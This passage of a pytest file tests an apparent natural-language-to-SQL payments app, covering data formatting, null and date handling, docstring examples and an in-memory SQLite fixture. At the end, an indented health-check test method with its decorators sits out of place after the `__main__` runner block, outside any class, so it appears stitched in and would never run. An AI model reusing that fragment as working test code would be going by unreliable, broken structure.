        result = DataFormatter.format_for_visualization(precise_data, query_info)
        
        assert result['status'] == 'success'
        # Verify precision is maintained in JSON serialization
        for record in result['data']:
            assert 'amount' in record
            assert isinstance(record['amount'], (int, float, str))
    
    def test_date_time_handling(self):
        """Test date and time data handling"""
        # Test with various date formats
        date_data = pd.DataFrame({
            'date': pd.date_range('2024-01-01', periods=3, freq='D'),
            'datetime': pd.date_range('2024-01-01 00:00:00', periods=3, freq='H'),
            'amount': [100, 200, 300]
        })
        
        query_info = {'query': 'Date test'}
        result = DataFormatter.format_for_visualization(date_data, query_info)
        
        assert result['status'] == 'success'
        assert 'line_chart' in result['metadata']['suggested_charts']
        
        # Verify dates are properly serialized
        for record in result['data']:
            assert 'date' in record
            assert 'datetime' in record
    
    def test_null_value_handling(self):
        """Test NULL/NaN value handling"""
        null_data = pd.DataFrame({
            'category': ['Food', None, 'Transport', ''],
            'amount': [100, float('nan'), 200, None]
        })
        
        query_info = {'query': 'NULL test'}
        result = DataFormatter.format_for_visualization(null_data, query_info)
        
        assert result['status'] == 'success'
        assert result['metadata']['row_count'] == 4
        
        # Verify NULL handling in JSON serialization
        for record in result['data']:
            # NaN should be converted to None/null
            if pd.isna(record.get('amount')):
                assert record['amount'] is None or record['amount'] != record['amount']  # NaN check

# Documentation Tests
class TestDocumentation:
    """Test that code matches documentation"""
    
    def test_example_usage_in_docstrings(self):
        """Test examples from docstrings actually work"""
        # Test InputPayload example
        payload = InputPayload(CIN=22, sort_code=123456)
        assert payload.CIN == 22
        assert payload.sort_code == 123456
        
        # Test filter conditions example
        conditions = payload.to_filter_conditions()
        assert conditions['customer_id'] == 22
        assert conditions['sort_code'] == 123456
    
    def test_api_examples(self):
        """Test API usage examples from documentation"""
        with patch('multi_table_nlsql.NLToSQLAgent') as mock_agent_class:
            mock_agent = Mock()
            mock_agent_class.return_value = mock_agent
            mock_agent.db_manager.connect.return_value = None
            
            # Test factory function example
            api = create_api("sqlite:///:memory:", "test-key")
            assert api is not None
            assert isinstance(api, NLToSQLAPI)

# Final Test Summary and Configuration
class TestSummary:
    """Test summary and configuration validation"""
    
    def test_all_imports_available(self):
        """Verify all required imports are available"""
        required_modules = [
            'pandas', 'sqlalchemy', 'openai', 'pydantic', 
            'pytest', 'unittest.mock', 'asyncio', 'json'
        ]
        
        for module_name in required_modules:
            try:
                __import__(module_name)
            except ImportError:
                pytest.fail(f"Required module {module_name} not available")
    
    def test_test_coverage_completeness(self):
        """Verify test coverage of main classes"""
        tested_classes = [
            'InputPayload', 'TableMapping', 'AgentState', 'DatabaseManager',
            'LLMService', 'DataFormatter', 'NLToSQLAgent', 'NLToSQLApp',
            'NLToSQLAPI', 'QueryResultStorage'
        ]
        
        # Verify all classes have corresponding test classes
        test_class_names = [cls.__name__ for cls in globals().values() 
                           if isinstance(cls, type) and cls.__name__.startswith('Test')]
        
        for class_name in tested_classes:
            expected_test_class = f"Test{class_name}"
            # Check if test class exists (may be named differently)
            has_test = any(class_name.lower() in test_name.lower() 
                          for test_name in test_class_names)
            assert has_test, f"No test class found for {class_name}"

# Pytest Configuration
def pytest_configure(config):
    """Configure pytest with custom markers"""
    config.addinivalue_line(
        "markers", "performance: mark test as performance test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as integration test"
    )
    config.addinivalue_line(
        "markers", "security: mark test as security test"
    )

# Test Utilities
def create_test_database():
    """Utility to create test database for integration tests"""
    from sqlalchemy import create_engine, text
    
    engine = create_engine("sqlite:///:memory:")
    with engine.connect() as conn:
        # Create basic test tables
        conn.execute(text("""
            CREATE TABLE payments (
                payment_id INTEGER PRIMARY KEY,
                user_id TEXT,
                customer_id INTEGER,
                amount DECIMAL(10,2),
                category_id INTEGER
            )
        """))
        
        conn.execute(text("""
            CREATE TABLE categories (
                category_id INTEGER PRIMARY KEY,
                category_name TEXT
            )
        """))
        
        # Insert test data
        conn.execute(text("""
            INSERT INTO payments VALUES 
            (1, 'user_001', 22, 100.00, 1),
            (2, 'user_001', 22, 200.00, 2)
        """))
        
        conn.execute(text("""
            INSERT INTO categories VALUES 
            (1, 'Food'),
            (2, 'Entertainment')
        """))
        
        conn.commit()
    
    return engine

if __name__ == "__main__":
    # Run tests with comprehensive configuration
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--durations=10",
        "--cov=multi_table_nlsql",
        "--cov-report=html:htmlcov",
        "--cov-report=term-missing",
        "--cov-fail-under=85",  # Require 85% coverage
        "--asyncio-mode=auto",
        "--strict-markers",
        "-m", "not performance",  # Skip performance tests by default
        "--maxfail=5"  # Stop after 5 failures
    ])
    @patch('multi_table_nlsql.load_dotenv')
    @patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'})
    def test_health_check_success(self, mock_load_dotenv, mock_check_deps):
        """Test successful health check"""
        mock_check_deps.return_value = True
        
        with patch('multi_table_nlsql.create_engine') as mock_create_engine:
            mock_engine = Mock()
            mock_connection = Mock()
            mock_connection.__enter__ = Mock(return_value=mock_connection)
            mock_connection.__exit__ = Mock(return_value=None)
            mock_engine.connect.return_value = mock_connection
            mock_create_engine.return_value = mock_engine
            
            with patch('multi_table_nlsql.setup_database_tables') as mock_setup_tables:
                mock_setup_tables.return_value = True
                
                result = health_check()
                
                assert result is True